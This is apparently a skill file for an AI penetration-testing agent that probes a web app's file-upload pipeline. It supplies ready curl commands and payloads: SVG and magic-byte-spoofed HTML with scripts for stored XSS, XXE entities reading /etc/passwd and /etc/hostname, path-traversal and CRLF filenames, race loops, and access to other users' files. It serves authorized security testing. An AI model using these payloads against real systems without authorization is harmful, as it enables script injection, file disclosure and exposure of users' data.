---
name: file_upload_pipeline
agent: agent9_interceptor
description: Test the full upload-to-serve chain — where files land, how they're served, and what parses them — for XSS, traversal, and parser bugs.
---

# File Upload Pipeline

## Purpose

Upload is never one bug — it's a pipeline: the upload request, validation, storage, processing (thumbnails, EXIF, document parsing, AV scan), and serving. Each stage has its own flaws, and the *gaps between stages* (race between upload and AV scan, serve path different from upload path) are where the real bugs live. This skill walks a file through the entire pipeline and attacks every stage. Real-world impact: stored XSS via SVG served inline, path traversal writing outside the upload dir, XXE/RCE in document parsers, or a direct S3 URL that bypasses all access control.

## Division of labor

- **Consumes:** upload endpoints found by `spa_api_replay` or `spa_state_crawl` (method + path + accepted params); an authenticated session with upload permission
- **Produces:** the finished artifact — `findings/file_upload_pipeline_confirmed.md` containing the pipeline map (stage × behavior), per-stage test results, raw pairs, and verdicts

## When to use / when NOT to use

- **Use when:** the app accepts any file upload (avatar, document, attachment, import, media); each upload feature gets its own pipeline walk.
- **Skip when (time-pass filter):** no upload functionality exists anywhere in the app (verify via `spa_state_crawl` route inventory — don't assume); the upload is a third-party widget (e.g. embedded Cloudinary) that never touches the target's infrastructure (note it, test the *integration* instead: signed params, callback URLs).

## Methodology

1. **Map the pipeline stages.** Upload one benign file (small PNG) and record everything: the upload request/response, any returned URL or ID, processing delays (poll for status changes), the final served URL, response headers on serve (`Content-Type`, `Content-Disposition`, `X-Content-Type-Options`), and where the file is stored (same host? CDN? S3-style URL?). Draw the stage map — this is your test plan.
2. **Baseline the validators.** Upload: a valid PNG, a valid JPEG, a `.txt` renamed to `.png`, a PNG with `.txt` extension, an empty file, and a 0-byte file. Record accept/reject + error messages for each. The error messages reveal which validator runs (extension? magic bytes? MIME?).
3. **Extension battery.** For each rejected type, try: double extensions (`shell.php.png`, `x.png.php`), case tricks (`X.PNG`, `x.PnG`), trailing dots/spaces (`x.png.`, `x.png `), null-byte-era tricks (mostly dead — one quick try), semicolons (`x.png;.php`), and unknown-but-similar extensions (`.png1`, `.pngx`). Record which the server accepts.
4. **Magic-byte spoofing.** Take a real payload file (HTML/SVG with script) and prepend valid magic bytes (PNG `\x89PNG`, JPEG `FF D8 FF`, GIF `GIF89a`). If magic-byte checks pass but content is served as HTML, that's stored XSS when served inline.
5. **Content-Type games.** Upload with mismatched `Content-Type` headers (declare `image/png`, send HTML). Then request the served file and check what `Content-Type` the *server* sends: attacker-controlled content served as `text/html` without `Content-Disposition: attachment` = stored XSS, CONFIRMED.
6. **SVG / HTML / XML uploads.** Upload SVG with `<script>`, SVG with `onload` event handlers, HTML files, and XML with XXE payloads (`<!ENTITY xxe SYSTEM "file:///etc/passwd">`). Then: (a) fetch the served file and check if scripts survive, (b) open it in the browser context and check execution, (c) check parser error messages for XXE evidence. Serve-inline + script-execution = stored XSS, CONFIRMED.
7. **Filename traversal.** Upload with filenames: `../../evil.png`, `..\\evil.png`, `/tmp/evil.png`, absolute paths, and URL-encoded variants (`%2e%2e%2f`). Then probe whether the file landed outside the upload dir (request the traversed path). Any write outside = path traversal, CONFIRMED.
8. **Filename injection.** Filenames with: quotes, `<script>`, newlines/CRLF (`%0d%0a`), semicolons, unicode tricks. Check the served `Content-Disposition` header and any page that renders the filename — header injection or reflected XSS via filename.
9. **Race the pipeline.** Upload a malicious file and *immediately* request the served URL in a tight loop (50 requests over 5 seconds). If the file is servable before AV/validation completes, the pipeline has a TOCTOU gap — CONFIRMED even if the file is deleted seconds later.
10. **Parser differential.** Upload polyglots and malformed files: truncated PNG, PNG with huge dimensions in IHDR (decompression bomb — small file, don't DoS), EXIF with scripts, PDF with JS actions, Office docs with macros/DDE, ZIP bombs (tiny, controlled). Record which parsers run (thumbnails? metadata extraction? text extraction?) and their error messages — verbose parser errors leak versions for CVE matching.
11. **Serve-path authorization.** Take another user's file URL/ID (from the app's UI or by guessing sequential IDs) and request it: unauthenticated, as another user, with the extension changed. Direct object URLs (S3/CDN) that bypass the app's authZ = broken access control on the serve path, CONFIRMED.
12. **Overwrite and squat.** Upload a file, note its served URL; upload a *different* file with the same filename. Does it overwrite? Version? If predictable URLs + overwrite = you can replace another user's avatar/asset (especially with sequential IDs or username-derived paths).
13. **Metadata extraction.** Download your served file and inspect: does it retain EXIF (GPS?), original filename in headers, internal paths in metadata? Then upload a file *with* sensitive EXIF and check if the pipeline strips it — failure to strip is a privacy leak for the app's users.
14. **Delete lifecycle.** Delete the uploaded file via the UI/API, then request the served URL again. Still served? CDN-cached? The delete must propagate — if not, "deleted" user data persists.
15. **Write the finished artifact.** Pipeline stage map + per-stage results + raw pairs + verdicts.

## Exact commands

Benign baseline upload (multipart):
```bash
printf '\x89PNG\r\n\x1a\n' > /tmp/ok.png  # minimal PNG magic
curl -s -X POST "https://<TARGET>/api/<upload-path>" -b <COOKIE_JAR> \
  -F "file=@/tmp/ok.png;type=image/png" -w "\nHTTP:%{http_code}\n" | head -20
# Record: response body (URL? ID?), and time until the file is servable.
```

Serve-header check (the XSS question):
```bash
curl -s -D /tmp/serve_headers.txt -o /tmp/served_file "https://<TARGET>/<served-path>"
grep -iE '^(content-type|content-disposition|x-content-type-options)' /tmp/serve_headers.txt
# text/html + no Content-Disposition: attachment + no nosniff = stored XSS servable inline.
```

SVG stored-XSS probe:
```bash
cat > /tmp/x.svg <<'EOF'
<svg xmlns="http://www.w3.org/2000/svg" onload="alert(document.domain)"><rect width="10" height="10"/></svg>
EOF
curl -s -X POST "https://<TARGET>/api/<upload-path>" -b <COOKIE_JAR> \
  -F "file=@/tmp/x.svg;type=image/svg+xml" | head -10
# Then fetch the served URL and check: does the onload survive? What Content-Type?
curl -s "https://<TARGET>/<served-svg-path>" | grep -o 'onload' | head -2
```

Magic-byte spoof (HTML wearing a PNG header):
```bash
(printf '\x89PNG\r\n\x1a\n'; cat <<'EOF'
<html><script>alert(document.domain)</script></html>
EOF
) > /tmp/spoof.png
curl -s -X POST "https://<TARGET>/api/<upload-path>" -b <COOKIE_JAR> \
  -F "file=@/tmp/spoof.png;type=image/png" -w "\nHTTP:%{http_code}\n" | head -5
```

Filename traversal battery:
```bash
for N in '../../evil.png' '..%2f..%2fevil.png' '/tmp/evil.png' '....//evil.png' '..%252fevil.png'; do
  echo "=== $N ==="
  curl -s -X POST "https://<TARGET>/api/<upload-path>" -b <COOKIE_JAR> \
    -F "file=@/tmp/ok.png;filename=$N" -w "\nHTTP:%{http_code}\n" | head -4
done
# Then probe https://<TARGET>/evil.png, /uploads/evil.png, etc. for the landed file.
```

Pipeline race (TOCTOU):
```bash
URL="https://<TARGET>/api/<upload-path>"
for i in $(seq 1 50); do
  curl -s -o /dev/null -w "%{http_code}\n" "https://<TARGET>/<predicted-served-path>" &
done; wait
# Any 200 BEFORE validation completes = race gap. Time it: upload, then immediate loop.
```

XXE probe document:
```bash
cat > /tmp/xxe.svg <<'EOF'
<?xml version="1.0"?><!DOCTYPE r [<!ENTITY xxe SYSTEM "file:///etc/hostname">]>
<svg xmlns="http://www.w3.org/2000/svg"><text>&xxe;</text></svg>
EOF
curl -s -X POST "https://<TARGET>/api/<upload-path>" -b <COOKIE_JAR> -F "file=@/tmp/xxe.svg" | head -10
# Check served/processed output for the hostname string; check error messages for parser disclosure.
```

Serve-path authZ (another user's file):
```bash
curl -s "https://<TARGET>/<victim-file-url>" -w "\nNOAUTH:%{http_code}\n" -o /tmp/victim_file
curl -s "https://<TARGET>/<victim-file-url>" -b <OTHER_USER_JAR> -w "\nOTHERUSER:%{http_code}\n" -o /dev/null
```

Metadata strip check:
```bash
exiftool /tmp/served_file 2>/dev/null | head -20 || python3 -c "
from PIL import Image; im = Image.open('/tmp/served_file'); print(im.info.get('exif') and 'EXIF RETAINED' or 'no EXIF')"
# Upload a file WITH GPS EXIF, download the served copy: GPS still present -> privacy leak for users.
```

Delete-lifecycle verification:
```bash
# Delete via UI/API, then:
curl -s -o /dev/null -w "AFTER-DELETE:%{http_code}\n" "https://<TARGET>/<served-path>"
curl -s -o /dev/null -w "CDN-EDGE:%{http_code}\n" -H "Cache-Control: no-cache" "https://<TARGET>/<served-path>"
```

## Completion-bias defenses

- [ ] Step 1: pipeline stage map drawn (upload → validate → store → process → serve, with URLs + headers)
- [ ] Step 2: six-file validator baseline recorded with error messages
- [ ] Step 3: extension battery run (double ext, case, dots, semicolons)
- [ ] Step 4: magic-byte spoofing tested
- [ ] Step 5: Content-Type mismatch tested; serve headers recorded
- [ ] Step 6: SVG/HTML/XML uploads tested; script survival + execution checked
- [ ] Step 7: filename traversal battery run; traversed paths probed
- [ ] Step 8: filename injection tested (headers + rendered pages)
- [ ] Step 9: pipeline race tested (50 immediate requests)
- [ ] Step 10: parser differential run (polyglots, EXIF, PDF/Office, controlled bombs)
- [ ] Step 11: serve-path authZ tested (noauth + other-user on victim file URL)
- [ ] Step 12: overwrite/squat behavior tested
- [ ] Step 13: metadata strip/retain behavior documented
- [ ] Step 14: delete lifecycle verified (URL after delete)
- [ ] Step 15: finished artifact written to disk
- **Review step:** agent10_review must verify: (a) the pipeline stage map exists with real URLs/headers, (b) every CONFIRMED stored-XSS/traversal claim has the upload pair AND the serve pair, (c) no upload feature was skipped (one pipeline walk per feature).
- **Nudge prompts:** "Keep going until you have tested the serve path, not just the upload request — the upload is half the pipeline." / "Do not report done before findings/file_upload_pipeline_confirmed.md exists on disk with the stage map." / "If you never raced the pipeline or tested the served Content-Type, you tested validation theater, not the pipeline."
- **Finished artifact definition:** `findings/file_upload_pipeline_confirmed.md` — pipeline stage map, per-stage test results, upload+serve raw pairs for anomalies, verdict per stage.

## Evidence standard

- Baseline: the benign-file control (upload → process → serve timings and headers) — every anomaly judged against it
- Reproduction: 2x independent reproduction required — re-upload the malicious file fresh; pipeline behavior must be stable, not a one-off race flake (except the race test itself, which needs 2 successful demonstrations)
- Raw evidence: full upload request/response AND served file request/response pairs, served file bytes (first 2KB) for content checks
- Verdicts: CONFIRMED (malicious file traverses the pipeline to a security-relevant outcome, reproducibly) / INCONCLUSIVE (needs a second model run or human) / NEGATIVE (pipeline validates + serves safely at every stage — documented so nobody re-tests it)

## Handoffs

- `spa_api_replay` supplies the upload endpoints and their parameter shapes.
- `xss_hunter`-style validation (if available in the harness) consumes confirmed stored-XSS serve pairs for execution proof.
- `client_side_access_control` consumes serve-path authZ failures (direct object URLs bypassing gates).
- agent10_review consumes `findings/file_upload_pipeline_confirmed.md` and verifies both halves of every pair (upload + serve) before anything ships.
